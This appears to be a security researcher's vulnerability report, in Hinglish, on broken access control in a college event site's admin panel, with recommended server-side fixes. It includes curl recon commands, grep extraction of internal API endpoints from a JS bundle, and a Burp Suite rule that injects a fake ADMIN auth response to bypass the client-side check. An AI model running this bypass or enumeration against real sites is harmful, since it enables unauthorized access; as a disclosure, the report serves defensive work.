# Security Vulnerability Report
**Target:** https://aurasoitfreshers.in  
**Date:** October 15, 2026  
**Researcher:** Om  
**Testing Type:** Authorized Security Assessment  
**Severity:** Medium-High  

---

## Summary

aurasoitfreshers.in (Next.js App Router, hosted on Vercel) mein 
Broken Access Control vulnerability found hui. Admin panel aur 
staff routes server-side authentication ke bina publicly 
accessible hain. Authentication sirf client-side JavaScript 
se enforce hoti hai jo trivially bypass ho sakti hai.

---

## Finding 1 — Broken Access Control (Medium-High)

### Title
Admin Panel Publicly Accessible Without Server-Side Authentication

### Affected Routes
- `/admin`
- `/staff/scanner`
- `/staff/login`

### Root Cause
Next.js static prerendering (`x-nextjs-prerender: 1`) ki wajah 
se in pages ka HTML build-time pe generate hota hai — 
per-request server-side auth check hota hi nahi.

### Step 1 — Verify Admin Panel Accessible Without Auth

```bash
curl -s -I https://aurasoitfreshers.in/admin
```

**Expected (secure):**

HTTP/2 302 — redirect to /staff/login


**Actual (vulnerable):**

HTTP/2 200 OK
x-nextjs-prerender: 1


### Step 2 — Full Dashboard HTML Confirm Karo

```bash
curl -s https://aurasoitfreshers.in/admin | grep -i "admin"
```

**Output:**

Admin Console
Organizer: Aura Senior Committee
AURA: THE RISE — Control Center
Export CSV
Search by Name, Enrollment, Ticket ID, or Phone


### Step 3 — RSC Payload Se Internal Structure Confirm

```bash
curl -s -H "Rsc: 1" \
     -H "Next-Router-Prefetch: 1" \
     https://aurasoitfreshers.in/admin
```

**Output reveals:**
- Table columns: Ticket/Booking, Student Details, 
  Enrollment ID, Payment, Entry Status
- Buttons: Export CSV, Recovery Actions
- Internal endpoints exposed in JS bundle

### Step 4 — JS Bundle Se Internal Endpoints Extract

```bash
curl -s https://aurasoitfreshers.in/_next/static/immutable/\
chunks/2sya1gafknka4.js -o admin_chunk.js

grep -oE '"[a-zA-Z0-9_/-]{3,60}"' admin_chunk.js | \
grep -iE 'cookie|session|token|staff|api/' | sort -u
```

**Output:**

"/api/admin/export"
"/api/admin/reconcile"
"/api/admin/stats"
"/api/staff/logout"
"/api/staff/me"
"/staff/login"
"/staff/scanner"



### Step 5 — Client-Side Auth Logic Extract

```bash
grep -oE '.{100}staff/me.{300}' admin_chunk.js
```

**Output (exact auth check logic):**
```javascript
let t = await fetch("/api/staff/me");
if (!t.ok) return void e.push("/staff/login");
let r = await t.json();
if (r.staff?.role !== "ADMIN") 
  return void e.push("/staff/scanner");
i(r.staff), I()
```

**Vulnerability confirm:** Sirf client-side check hai, 
koi server-side validation nahi.

### Step 6 — Client-Side Bypass PoC (Burp Suite)

**Setup:**
1. Burp Suite proxy on karo (port 8080)
2. Browser ko Burp ke through route karo
3. `Proxy → Options → Match and Replace` mein 2 rules add karo:

**Rule 1 — Status Fix:**


Type: Response header
Match: HTTP/2 500
Replace: HTTP/2 200


**Rule 2 — Fake Auth Response Inject:**

Type: Response body
Match: (empty)
Replace: {"staff":{"role":"ADMIN","id":"1","name":"Test"}}


4. Browser mein navigate karo: `https://aurasoitfreshers.in/admin`

**Result:**
- Frontend bypassed ✅
- `/api/admin/stats?status=ALL` call triggered ✅
- Backend returned 500 (accidentally protected) ✅

**[ATTACH: console_screenshot.png]**

Console mein clearly visible:

Failed to load resource: net::ERR_HTTP2_PROTOCOL_ERROR
api/admin/stats?status=ALL
Failed to load resource: the server responded with 500
Error: Failed to load admin stats


---

## Finding 2 — Improper Error Handling (Low)

### Title
Admin/Staff APIs Return 500 Instead of 401

### Affected Endpoints

```bash
# Test each endpoint
curl -s -i https://aurasoitfreshers.in/api/staff/me
curl -s -i https://aurasoitfreshers.in/api/admin/stats
curl -s -i https://aurasoitfreshers.in/api/admin/export
curl -s -i https://aurasoitfreshers.in/api/admin/reconcile
```

**Expected:**

HTTP/2 401 Unauthorized
{"error": "Unauthorized"}


**Actual (all 4 endpoints):**

HTTP/2 500 Internal Server Error
(empty body)


### Root Cause
Auth middleware mein null-check missing hai:
```javascript
// Vulnerable code (likely):
const user = jwt.verify(req.cookies.token, SECRET)
// token undefined hone par throws uncaught exception → 500

// Fixed code:
if (!req.cookies?.token) {
  return res.status(401).json({ error: "Unauthorized" })
}
```

---

## Good News

Real student data **leak nahi hua:**
- Backend APIs accidentally crash-protected hain
- 500 + connection drop = data exposure nahi
- Event safely conduct ho sakta hai

---

## Impact Assessment

| Risk | Status |
|------|--------|
| Admin UI exposed | ✅ Confirmed |
| Internal endpoints leaked | ✅ Confirmed |
| Client-side auth bypass | ✅ Confirmed |
| Real student data exposed | ❌ Not exploited |
| Payment data leaked | ❌ Not exploited |

---

## Recommendations

### Fix 1 — Server-Side Middleware Auth (Priority: Critical)

`middleware.ts` create karo project root mein:

```typescript
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  const protectedPaths = ['/admin', '/staff/scanner', 
                          '/api/admin', '/api/staff']
  
  const isProtected = protectedPaths.some(path => 
    request.nextUrl.pathname.startsWith(path)
  )
  
  if (isProtected) {
    const token = request.cookies.get('staff_token')
    
    if (!token) {
      // API routes ke liye 401
      if (request.nextUrl.pathname.startsWith('/api')) {
        return NextResponse.json(
          { error: 'Unauthorized' }, 
          { status: 401 }
        )
      }
      // Page routes ke liye redirect
      return NextResponse.redirect(
        new URL('/staff/login', request.url)
      )
    }
  }
  
  return NextResponse.next()
}

export const config = {
  matcher: ['/admin/:path*', '/staff/:path*', 
            '/api/admin/:path*', '/api/staff/:path*']
}
```

### Fix 2 — Proper 401 in API Routes

Har admin/staff API file ke top pe:
```typescript
const session = await getServerSession(req)
if (!session) {
  return res.status(401).json({ error: "Unauthorized" })
}
```

### Fix 3 — Disable Static Prerendering for Protected Routes

`/admin/page.tsx` mein:
```typescript
export const dynamic = 'force-dynamic'
export const revalidate = 0
```

---

## Timeline

| Time | Action |
|------|--------|
| Oct 15, 10:19 | Initial recon — RSC requests analyzed |
| Oct 15, 10:34 | `/admin` unauthenticated access confirmed |
| Oct 15, 10:39 | Internal endpoints discovered via JS bundle |
| Oct 15, 10:55 | Client-side bypass PoC executed |
| Oct 15, 11:09 | `/api/admin/stats` endpoint confirmed |
| Oct 15, 11:15 | Report drafted |

---

## Attachments

- [ ] `console_screenshot.png` — Burp bypass PoC
- [ ] `admin_curl_response.txt` — Raw HTML response
- [ ] `js_bundle_endpoints.txt` — Extracted API endpoints

---

*Report generated after authorized security assessment.*
*All testing done ethically — no real student data accessed.*
